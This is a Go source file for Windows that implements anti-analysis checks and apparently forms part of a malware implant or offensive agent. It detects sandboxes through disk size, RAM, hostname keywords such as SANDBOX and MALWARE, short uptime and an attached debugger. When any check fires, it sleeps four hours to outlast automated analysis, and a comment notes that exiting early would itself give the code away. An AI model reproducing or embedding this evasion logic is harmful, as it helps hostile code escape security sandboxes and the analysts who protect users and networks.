//go:build windows

package main

import (
	"strings"
	"time"
	"unsafe"

	"golang.org/x/sys/windows"
)

var (
	sbGetDiskFreeSpaceEx  = kernel32.NewProc("GetDiskFreeSpaceExW")
	sbGlobalMemoryStatus  = kernel32.NewProc("GlobalMemoryStatusEx")
	sbGetTickCount64      = kernel32.NewProc("GetTickCount64")
	sbIsDebuggerPresent   = kernel32.NewProc("IsDebuggerPresent")
)

type memoryStatusEx struct {
	dwLength                uint32
	dwMemoryLoad            uint32
	ullTotalPhys            uint64
	ullAvailPhys            uint64
	ullTotalPageFile        uint64
	ullAvailPageFile        uint64
	ullTotalVirtual         uint64
	ullAvailVirtual         uint64
	ullAvailExtendedVirtual uint64
}

// checkSandbox detects automated analysis environments using the same
// five checks as church.c's IsSandboxed(). If a sandbox is detected,
// we sleep 4h to exhaust the analysis window rather than exiting
// (exiting immediately is itself a behavioral signature).
func checkSandbox() {
	if isSandboxed() {
		time.Sleep(4 * time.Hour)
	}
}

func isSandboxed() bool {
	// Check 1: disk < 60 GB
	root, _ := windows.UTF16PtrFromString(`C:\`)
	var freeBytesAvail, totalBytes, totalFreeBytes uint64
	sbGetDiskFreeSpaceEx.Call(
		uintptr(unsafe.Pointer(root)),
		uintptr(unsafe.Pointer(&freeBytesAvail)),
		uintptr(unsafe.Pointer(&totalBytes)),
		uintptr(unsafe.Pointer(&totalFreeBytes)),
	)
	if totalBytes > 0 && totalBytes < 64424509440 { // 60 GB
		return true
	}

	// Check 2: RAM < 4 GB
	ms := memoryStatusEx{dwLength: uint32(unsafe.Sizeof(memoryStatusEx{}))}
	sbGlobalMemoryStatus.Call(uintptr(unsafe.Pointer(&ms)))
	if ms.ullTotalPhys > 0 && ms.ullTotalPhys < 4294967296 { // 4 GB
		return true
	}

	// Check 3: suspicious hostname
	var nameBuf [windows.MAX_COMPUTERNAME_LENGTH + 1]uint16
	nameLen := uint32(len(nameBuf))
	windows.GetComputerName(&nameBuf[0], &nameLen)
	name := strings.ToUpper(windows.UTF16ToString(nameBuf[:]))
	for _, token := range []string{"SANDBOX", "VIRUS", "MALWARE", "TEST", "WIN-", "7SILVER", "CODER", "DEBUG", "ANALYSIS"} {
		if strings.Contains(name, token) {
			return true
		}
	}

	// Check 4: uptime < 10 minutes
	tick, _, _ := sbGetTickCount64.Call()
	if tick < 600000 {
		return true
	}

	// Check 5: debugger present
	r, _, _ := sbIsDebuggerPresent.Call()
	if r != 0 {
		return true
	}

	return false
}
